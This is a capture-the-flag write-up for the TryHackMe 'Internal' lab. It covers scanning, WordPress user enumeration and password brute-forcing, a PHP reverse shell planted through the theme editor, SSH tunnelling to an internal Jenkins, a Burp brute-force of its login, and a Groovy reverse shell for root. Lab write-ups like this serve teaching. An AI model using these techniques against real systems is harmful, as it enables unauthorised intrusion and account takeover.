# Welcome! This is a report that explain the steps I used to solve the Internal CTF in a simple and quick way.

 And My Profile on TryHackMe : https://tryhackme.com/p/osaid.ahmed.soh
---

### Internal ctf

![](222b3e855f88a482c1267748f76f90e0.jpeg)

### 1. Prepare the IP
```
sudo nano /etc/hosts
```

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20213626.png)

2.scan
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nmap -sC -sV 10.49.148.219   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 21:39 EET  
Nmap scan report for internal.thm (10.49.148.219)  
Host is up (0.26s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)  
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)  
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
```
I found that ports 80 and 22 are open
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ gobuster dir -u http://10.49.148.219 -w /usr/share/wordlists/dirb/common.txt  
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.49.148.219  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.hta                 (Status: 403) [Size: 278]  
/.htaccess            (Status: 403) [Size: 278]  
/.htpasswd            (Status: 403) [Size: 278]  
/blog                 (Status: 301) [Size: 313] [--> http://10.49.148.219/blog/]  
/index.html           (Status: 200) [Size: 10918]  
/javascript           (Status: 301) [Size: 319] [--> http://10.49.148.219/javascript/]  
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.49.148.219/phpmyadmin/]  
/server-status        (Status: 403) [Size: 278]  
/wordpress            (Status: 301) [Size: 318] [--> http://10.49.148.219/wordpress/]  
Progress: 4613 / 4613 (100.00%)  
===============================================================  
Finished  
===============================================================
```

We will access /blog
![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214654.png)

When we scroll down, we find a login page
![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214916.png)

After we access it and try to log in, we see that it first verifies the username, and this error appears
![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20215219.png)

So we will guess the username using tools like Hydra, WPScan, or Burp Suite, but I’ll use the easiest one
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php -e u 

```
![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20223843.png)

And if it doesn’t work, or you run it many times and it still doesn’t work, use --no-update
```
wpscan --url http://internal.thm/blog/wp-login.php -e u --no-update

```
This gives us the username, so we will guess the password
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-08%20145053.png)

And finally, we logged in successfully
![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/1_l-GlDWbhwfVFEOaJ5-bEmg.png)

We go to 'The email is correct' and then to 'Appearance'
![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20154649.png)

Then we go to the Theme Editor
![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155152.png)

Then to index.php
![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155421.png)

We place reverse-shell.php in the PHP code section
![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155529.png)

And after you put the modified PHP code, we click Update File.
Then we visit any page where the code runs, after setting up nc
```
┌──(kali㉿kali)-[~/Downloads/THM]
└─$ nc -lvnp 1234
```
Here’s an example of the URL: http://internal.thm/blog/index.php
. You can access any page where it runs, like index.php

And after we get the reverse shell, we go to /opt
![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-09%20203614.png)
And this is the SSH username and password, so we will log in through SSH.
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh aubreanna@10.49.182.209
```
And after connecting, we will do:
![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20162835.png)
```
aubreanna@internal:~$ cat jenkins.txt                             
Internal Jenkins service is running on 172.17.0.2:8080    
aubreanna@internal:~$
```
This means we can tunnel the internal Jenkins service on localhost port 8080, and we can do that through SSH
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh -L 8080:localhost:8080 aubreanna@10.49.182.209

```
And after that, we’ll run localhost:8080, and if it doesn’t work, open localhost without specifying the port
![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20164101.png)

The first thing we’ll do there is look for the default Jenkins user, and we’ll find **admin**
And we’ll try to guess the password using Burp Suite. After opening the Burp Suite browser, we’ll follow these steps — and of course, make the request after step 1
![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165637.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165919.png)
In step 2, we will highlight what comes after password= because what follows in this request is the actual password.
Then perform step 3 and step 4.
In step 4, choose the wordlist — the best one is rockyou.txt because it’s very large and strong, and its path is:
/usr/share/wordlists/rockyou.txt
Then run the attack

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20170853.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20184132.png)

After you click on Length, you’ll notice a big difference between the correct and incorrect passwords, then log in
![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204211.png)

We go here, and then here
![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204243.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204307.png)

You’ll find the programming language is Groovy script
 Search for a Groovy reverse-shell code and place it there after modifying it
![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204353.png)

And before clicking Run, start nc
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
```

And click Run
![](https://github.com/Red-Bugs/Internal-ctf/blob/aeb9fcd3c0ebce543c2b62204d40a4527261e507/Screenshot%202025-12-09%20205307.png)

And with that, you obtained root
![](https://github.com/Red-Bugs/Internal-ctf/blob/912fb2e2911487b88137cccf52c9dc5ab801cf88/Screenshot%202025-12-09%20205307.png)

Then, congratulations on completing it!
